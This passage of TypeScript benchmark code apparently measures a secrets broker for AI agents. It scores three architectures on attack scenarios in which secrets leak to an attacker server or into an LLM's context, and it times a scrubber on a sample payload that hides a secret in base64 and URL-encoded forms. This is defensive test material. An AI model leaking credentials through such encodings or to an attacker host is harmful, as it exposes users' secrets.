      message: 'Completed API execution with verbose upstream metadata '.repeat(24),
      debugAuth: `Basic ${Buffer.from(`merchant:${STRIPE_SECRET}`).toString('base64')}`,
      callback: `https://api.trusted.internal/return?key=${STRIPE_SECRET.replace(/_/g, '%5F')}`,
      padding: 'x'.repeat(512),
    });

    const scrubSamplesUs: number[] = [];
    for (let i = 0; i < microIterations; i++) {
      const t0 = performance.now();
      scrubber.scrub(sample2KbPayload, activeSecretSet);
      scrubSamplesUs.push((performance.now() - t0) * 1000);
    }

    const auditVerifySamplesUs: number[] = [];
    for (let i = 0; i < 30; i++) {
      const t0 = performance.now();
      vault.verifyAuditChain();
      auditVerifySamplesUs.push((performance.now() - t0) * 1000);
    }

    memVault.close();

    const attackScenarios = scenarios.slice(0, 7);
    const buildScorecard = (
      key: 'raw_env_agent' | 'naive_placeholder_broker' | 'password_one',
      contextExp: number,
      authSuccess: boolean
    ): ArchitectureScorecard => {
      const defendedCount = attackScenarios.filter((s) => s[key].defended).length;
      const leakedCount = attackScenarios.filter((s) => s[key].leakedToAttacker || s[key].leakedToLlmContext).length;
      return {
        attackScenariosTotal: attackScenarios.length,
        attacksDefended: defendedCount,
        attackDefenseRatePct: Number(((defendedCount / attackScenarios.length) * 100).toFixed(1)),
        secretsLeakedCount: leakedCount,
        llmContextSecretExposures: contextExp,
        authorizedWorkflowSuccessRatePct: authSuccess ? 100 : 0,
      };
    };

    const auditIntegrity = vault.verifyAuditChain();
    const meanHttpMs = Number(
      (httpLatenciesMs.reduce((a, b) => a + b, 0) / Math.max(1, httpLatenciesMs.length)).toFixed(3)
    );

    return {
      timestamp: new Date().toISOString(),
      nodeVersion: process.version,
      scenarios,
      scorecards: {
        raw_env_agent: buildScorecard('raw_env_agent', rawContextExposures + 1, rawOk),
        naive_placeholder_broker: buildScorecard('naive_placeholder_broker', naiveContextExposures, naiveOk),
        password_one: buildScorecard('password_one', pw1ContextExposures, pw1AuthorizedOk),
      },
      performance: {
        envelopeEncryptAadUs: summarizeUs(encSamplesUs),
        envelopeDecryptAadVerifyUs: summarizeUs(decSamplesUs),
        sixEncodingScrub2KbUs: summarizeUs(scrubSamplesUs),
        auditChainVerifyUs: summarizeUs(auditVerifySamplesUs),
        endToEndHttpBrokerMeanMs: meanHttpMs,
      },
      auditChainIntegrity: {
        valid: auditIntegrity.valid,
        entriesChecked: auditIntegrity.entriesChecked,
        headHash: auditIntegrity.headHash,
      },
    };
  } finally {
    vault.close();
    naiveDb.close();
    await Promise.all([
      new Promise<void>((resolve) => trustedServer.close(() => resolve())),
      new Promise<void>((resolve) => evilServer.close(() => resolve())),
    ]);
    rmSync(tempDir, { recursive: true, force: true });
  }
}
